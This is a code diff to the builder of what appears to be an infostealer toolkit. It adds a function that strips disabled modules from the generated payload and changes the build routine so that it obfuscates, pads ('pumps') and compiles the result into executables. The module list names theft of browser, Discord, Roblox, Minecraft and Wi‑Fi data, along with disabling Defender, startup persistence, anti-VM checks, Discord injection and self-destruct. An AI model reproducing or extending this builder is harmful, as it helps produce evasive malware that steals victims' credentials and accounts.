@@ -508,47 +508,147 @@ class App(customtkinter.CTk):
             os.remove(f"./{filename}.py")
             os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
 
+
+
+    def clean_false_blocks(self, input_path, output_path, config_dict):
+        func_map = {
+            "wifi": ["Wifi"],
+            "roblox": ["robloxinfo"],
+            "browser": ["Browsers"],
+            "discord": ["Discord"],
+            "minecraft": ["Minecraft"],
+            "systeminfo": ["PcInfo"],
+            "backupcodes": ["BackupCodes"],
+            "defender": ["disable_defender"],
+            "startup": ["startup"],
+            "killprotector": ["killprotector"],
+            "antidebug_vm": ["Debug"],
+            "error": ["fakeerror"],
+            "injection": ["Injection"],
+            "anti_spam": ["AntiSpam"],
+            "self_destruct": ["SelfDestruct"]
+        }
+
+        keys_false = [k for k, v in config_dict.items() if not v]
+        if not keys_false:
+            shutil.copy(input_path, output_path)
+            return
+
+        to_skip = set(f for k in keys_false for f in func_map.get(k, []))
+        # Regex for def or class (regardless of indentation)
+        defclass_re = re.compile(r'^\s*(def|class)\s+([a-zA-Z_]\w*)\b')
+        # Regex for direct call (ex: Wifi(), PcInfo())
+        call_re = re.compile(r'^\s*([a-zA-Z_]\w*)\s*\(')
+        # Regex for lists (ex: threads = [Browsers, Wifi, ...])
+        list_re = re.compile(r'^\s*(\w+)\s*=\s*\[(.*?)\]')
+        # Regex for conditional blocks if __CONFIG__["key"]:
+        cond_re = re.compile(r'^\s*if\s+__CONFIG__\s*\[\s*[\'"](' + '|'.join(keys_false) + r')[\'"]\s*\]\s*:')
+
+        result = []
+        with open(input_path, encoding="utf-8") as f:
+            lines = f.readlines()
+
+        i = 0
+        skip = False
+        indent = 0
+        while i < len(lines):
+            line = lines[i]
+
+            # 1. Remove blocks if __CONFIG__["key"]:
+            if not skip and cond_re.match(line):
+                skip = True
+                indent = len(line) - len(line.lstrip())
+                i += 1
+                continue
+
+            # 2. Remove class/function definitions to ignore (even if indented)
+            match_defclass = defclass_re.match(line)
+            if not skip and match_defclass and match_defclass.group(2) in to_skip:
+                skip = True
+                indent = len(line) - len(line.lstrip())
+                i += 1
+                # Skip the whole block, even if it's empty
+                while i < len(lines):
+                    next_line = lines[i]
+                    if next_line.strip() == "" or (len(next_line) - len(next_line.lstrip()) > indent):
+                        i += 1
+                    else:
+                        break
+                skip = False
+                continue
+
+            # 3. Skip the entire indented block after a removed if
+            if skip:
+                if line.strip() == "" or (len(line) - len(line.lstrip()) > indent):
+                    i += 1
+                    continue
+                skip = False
+
+            # 4. Remove direct calls (e.g., Wifi(), PcInfo())
+            match_call = call_re.match(line)
+            if match_call and match_call.group(1) in to_skip:
+                i += 1
+                continue
+
+            # 5. Clean lists (e.g., threads = [Browsers, Wifi, ...])
+            match_list = list_re.match(line)
+            if match_list:
+                items = [item.strip() for item in match_list.group(2).split(",")]
+                items = [item for item in items if item and item not in to_skip]
+                new_line = f"{match_list.group(1)} = [{', '.join(items)}]\n"
+                result.append(new_line)
+                i += 1
+                continue
+
+            result.append(line)
+            i += 1
+
+        with open(output_path, "w", encoding="utf-8") as f:
+            f.writelines(result)
+
+
     def buildfile(self):
         filename = self.return_filename()
-
+        cleaned_filename = f"{filename}_cleaned.py"
+    
+        # 1. Generate the source file with the config
+        self.write_and_obfuscate(filename)
+    
+        # 2. Clean unnecessary blocks
+        self.clean_false_blocks(f"./{filename}.py", f"./{cleaned_filename}", self.updated_dictionary)
+    
+        # 3. Use the cleaned file for the rest of the build
         if self.get_filetype() == "py":
-            self.write_and_obfuscate(filename)
-
             if self.pump.get() == 1:
-                self.file_pumper(filename, "py", self.get_mb())
-
+                self.file_pumper(filename + "_cleaned", "py", self.get_mb())
             self.built_file()
-            self.builder_frame.after(3000, self.reset_build_button)
-
+            self.builder_frame.after(3000, self.reset_build_button())
+    
         elif self.get_filetype() == "pyinstaller":
-            self.write_and_obfuscate(filename)
-
-            thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
+            thread = threading.Thread(target=self.compile_file, args=(filename + "_cleaned", "pyinstaller",))
             thread.start()
             self.building_button_thread(thread)
-
             if self.pump.get() == 1:
-                self.file_pumper(filename, "exe", self.get_mb())
-
+                self.file_pumper(filename + "_cleaned", "exe", self.get_mb())
             self.built_file()
-            self.builder_frame.after(3000, self.reset_build_button)
-            self.cleanup_files(filename)
-
+            self.builder_frame.after(3000, self.reset_build_button())
+            self.cleanup_files(filename + "_cleaned")
+    
         elif self.get_filetype() == "cxfreeze":
-            self.write_and_obfuscate(filename)
-
-            thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
+            thread = threading.Thread(target=self.compile_file, args=(filename + "_cleaned", "cxfreeze",))
             thread.start()
             self.building_button_thread(thread)
-
             if self.pump.get() == 1:
-                self.file_pumper(filename, "exe", self.get_mb())
-
+                self.file_pumper(filename + "_cleaned", "exe", self.get_mb())
             self.built_file()
-            self.builder_frame.after(3000, self.reset_build_button)
+            self.builder_frame.after(3000, self.reset_build_button())
+            os.remove(f"./{cleaned_filename}")
+    
+        # Clean the intermediate file
+        if os.path.exists(f"./{filename}.py"):
             os.remove(f"./{filename}.py")
-
 
 if __name__ == "__main__":
     app = App()
     app.mainloop()
+
